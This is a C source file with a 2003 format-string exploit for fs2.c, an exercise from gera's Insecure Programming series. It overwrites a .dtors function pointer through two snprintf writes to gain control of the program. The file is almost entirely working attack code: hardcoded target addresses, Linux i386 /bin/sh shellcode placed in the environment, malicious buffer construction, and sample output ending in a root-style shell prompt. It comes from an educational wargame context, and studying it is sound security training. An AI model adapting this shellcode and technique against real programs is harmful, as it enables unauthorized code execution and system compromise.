/*
 * $Id: fs2-ex.c,v 1.1.1.1 2003/10/15 18:25:24 raptor Exp $
 *
 * fs2-ex.c - fs2.c exploit (gera's Insecure Programming)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit uses the format strings of the 2 snprintf() functions in the
 * vulnerable program to overwrite the first function pointer in .dtors
 * section, taking control of the program flow. The write operation is split
 * in 2 parts, each write is 2 bytes long.
 *
 * First buffer structure:
 * [DTORS (4 bytes)] [A padding (ret1 - 4 - 2)]
 * Second buffer structure:
 * [DTORS + 2 (4 bytes)] [A padding (ret2 - 4 - 2)]
 *
 * $ uname -a
 * Linux karma 2.4.20-rc4 #1 SMP Wed Nov 27 19:21:06 CET 2002 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./fs2-ex 
 * Using ret address       : 0xbfffffdd
 * Using .dtors address    : 0x8049598
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./fs2"		// this is the vulnerable program
#define	BUF	65536 		// max size of the 2 malicious buffers
#define DTORS	0x08049594 + 4	// address of first pointer in .dtors
//#define DEREG	0x080495ac	// __deregister_frame_info works too

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/i386 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
	char 	buf1[BUF], buf2[BUF];
	char	*p;
	int	ret1, ret2;

	/* put shellcode in environment */
	char 	*envp[2] = {sc, NULL};
	int	ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the malicious buffers */
	bzero(buf1, BUF);
	bzero(buf2, BUF);

	/* write first half of retaddr */
	p = buf1;
	*((void **)p) = (void *)(DTORS);
	p += 4;
	memset(p, 'A', (ret1 - 4 - 2));

	/* write second half of retaddr */
	p = buf2;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;
	memset(p, 'A', (ret2 - 4 - 2));

	/* print some output */
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf1, buf2, NULL, envp);
	perror("execle");
}
